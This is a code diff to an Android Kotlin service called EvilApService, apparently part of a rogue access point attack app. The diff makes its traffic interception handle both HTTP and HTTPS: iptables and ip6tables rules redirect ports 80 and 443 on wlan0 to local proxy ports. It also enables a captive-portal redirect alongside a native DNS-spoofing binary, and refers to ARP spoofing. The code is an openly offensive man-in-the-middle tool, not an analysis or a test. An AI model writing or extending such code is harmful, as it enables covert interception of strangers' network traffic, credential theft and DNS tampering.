@@ -77,7 +77,7 @@ class EvilApService: Service() {
                     }
                 }
                 is EventArpSpoof -> { nativeArpSpoof(it.state) }
-                is EventHttpRedirect -> { nativeHttpProxy(it.state) }
+                is EventTrafficRedirect -> { nativeTrafficRedirect(it.state, it.type) }
                 is EventHostChecked -> {
                     if(it.checked) {
                         if(it.h !in mCheckedHosts)
@@ -145,6 +145,7 @@ class EvilApService: Service() {
         sh.addCommand(listOf("pkill -f ${applicationInfo.dataDir}/lib/"))
         nativeArpSpoof(false)
         nativeDnsSpoof(false)
+        nativeTrafficRedirect(false, "HTTPS")
         for (shell in mShells)
             shell.close()
         stopSelf()
@@ -226,7 +227,6 @@ class EvilApService: Service() {
             })
         }
     }
-
     /**
      * Starts or stops the native arpspoof binary along with any necessary setup.
      * Sets up firewall rules and kernel parameters so that the OS networking stack will take care
@@ -278,27 +278,47 @@ class EvilApService: Service() {
             sh.addCommand(cmds)
         }
     }
-
     /**
-     * Controls rules that redirect HTTP traffic to a local port.
+     * Controls rules that redirect @param type traffic to a local port.
      * @param state Adds/removes iptables rules
+     * @param type Specifies which type of traffic to redirect (HTTP or HTTPS)
      */
-    private fun nativeHttpProxy(state: Boolean) {
+    private fun nativeTrafficRedirect(state: Boolean, type: String) {
         val sh = getIdleShell() ?: return
+        val dstPort: Int
+        val proxyPort: Int
+        when (type.toUpperCase()){
+            "HTTP" -> {
+                dstPort = 80
+                proxyPort = EvilApApp.instance.PORT_PROXY_HTTP
+            }
+            "HTTPS" -> {
+                dstPort = 443
+                proxyPort = EvilApApp.instance.PORT_PROXY_HTTPS
+            }
+            else -> {
+                Log.e(TAG, "Invalid traffic type!")
+                return
+            }
+        }
         val cmds: List<String> = if(state)
             listOf(
-                    "iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 1337",
-                    "ip6tables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 1337")
+                    "iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport $dstPort " +
+                            "-j REDIRECT --to-port $proxyPort",
+                    "ip6tables -t nat -A PREROUTING -i wlan0 -p tcp --dport $dstPort " +
+                            "-j REDIRECT --to-port $proxyPort")
         else
             listOf(
-                    "iptables -t nat -D PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 1337",
-                    "ip6tables -t nat -D PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 1337")
-
+                    "iptables -t nat -D PREROUTING -i wlan0 -p tcp --dport $dstPort " +
+                            "-j REDIRECT --to-port $proxyPort",
+                    "ip6tables -t nat -D PREROUTING -i wlan0 -p tcp --dport $dstPort " +
+                            "-j REDIRECT --to-port $proxyPort")
         sh.addCommand(cmds)
     }
-
     /**
-     *
+     * Starts native process that spoofs DNS responses
+     * Also adds iptables rule to redirect HTTP (port 80) requests to captive portal
+     * @param state starts or stops dns spoofing activity
      */
     private fun nativeDnsSpoof(state: Boolean) {
         // if myIp is not initialized then no scanning was done, and we don't know our IP yet
@@ -307,16 +327,17 @@ class EvilApService: Service() {
         val sh = getIdleShell() ?: return
         val path = applicationInfo.dataDir
         val cmds = if(state) {
-            listOf(//"iptables -t nat -I PREROUTING -p tcp -d $myIp --dport 80 -j REDIRECT --to-port 8080",
+            listOf("iptables -t nat -I PREROUTING -p tcp -d $myIp --dport 80 " +
+                    "-j REDIRECT --to-port ${EvilApApp.instance.PORT_CAPTIVE_PORTAL}",
                     "LD_LIBRARY_PATH=$path/lib/ $path$DNSSPOOF wlan0"
             )
         }
         else {
-            listOf("pkill -f $path$DNSSPOOF"
-                    //"iptables -t nat -D PREROUTING -p tcp -d $myIp --dport 80 -j REDIRECT --to-port 8080")
+            listOf("iptables -t nat -D PREROUTING -p tcp -d $myIp --dport 80 " +
+                    "-j REDIRECT --to-port ${EvilApApp.instance.PORT_CAPTIVE_PORTAL}",
+                    "pkill -f $path$DNSSPOOF"
             )
         }
-
         sh.addCommand(cmds, 0, object : Shell.OnCommandLineListener {
             override fun onCommandResult(commandCode: Int, exitCode: Int) {
                 Log.d("[native]DNSSPOOF", "$cmds \n(exit code: $exitCode)")
@@ -340,7 +361,7 @@ class EvilApService: Service() {
     class EventExit
     data class EventActiveScan(val type: String)
     data class EventArpSpoof(val state: Boolean)
-    data class EventHttpRedirect(val state: Boolean)
+    data class EventTrafficRedirect(val state: Boolean, val type: String)
     data class EventDnsSpoof(val state: Boolean)
     data class EventDnsLog(val state: Boolean)
     data class EventHostChecked(val h: Host, val checked: Boolean)
